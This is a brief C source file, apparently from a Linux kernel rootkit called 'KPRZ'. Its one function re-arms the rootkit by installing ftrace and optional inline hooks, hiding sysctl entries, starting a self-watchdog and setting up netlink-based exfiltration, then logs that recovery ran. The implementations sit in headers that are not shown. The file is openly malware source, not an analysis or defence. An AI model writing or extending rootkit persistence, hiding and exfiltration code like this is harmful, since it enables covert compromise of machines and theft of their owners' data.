#include "recovery_trigger.h"
#include "ftrace_hook.h"
#include "inline_hook.h"
#include "self_watchdog.h"
#include "sysctl_hiding.h"
#include "netlink_exfil.h"

void trigger_rootkit_recovery(void) {
    fh_install_hooks();
    setup_sysctl_hiding();
    start_self_watchdog();
    setup_netlink_exfil();
#ifdef ENABLE_INLINE_HOOK
    setup_inline_hooks();
#endif
    printk(KERN_INFO "KPRZ: Rootkit recovery triggered.\n");
}
